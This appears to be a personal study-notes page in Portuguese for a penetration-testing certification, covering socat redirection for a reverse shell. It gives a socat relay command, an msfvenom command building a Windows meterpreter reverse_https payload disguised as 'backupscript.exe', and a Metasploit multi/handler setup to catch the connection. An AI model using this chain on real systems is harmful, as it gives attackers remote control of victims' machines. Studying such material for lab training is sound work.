> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/pivoting-tunneling-and-port-forwarding/socat-redirection-with-a-reverse-shell.md).

# Socat Redirection with a Reverse Shell

[Socat](https://linux.die.net/man/1/socat) é uma ferramenta de retransmissão bidirecional que pode criar sockets de pipe entre `2`canais de rede independentes sem precisar usar tunelamento SSH.

* **Iniciando o Socat Listener no ubuntu**

```sh
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

* **Criando a carga útil do Windows**

```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

* Tenha em mente que precisamos transferir essa carga útil para o host Windows. Podemos usar algumas das mesmas técnicas usadas nas seções anteriores para fazer isso.
* **Iniciando o console MSF**

```sh
sudo msfconsole -q
```

* **Configurando e iniciando o multi/handler**

{% code lineNumbers="true" %}

```sh
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

{% endcode %}

* Podemos testar isso executando nossa carga útil no host Windows novamente, e devemos ver uma conexão de rede do servidor Ubuntu desta vez.
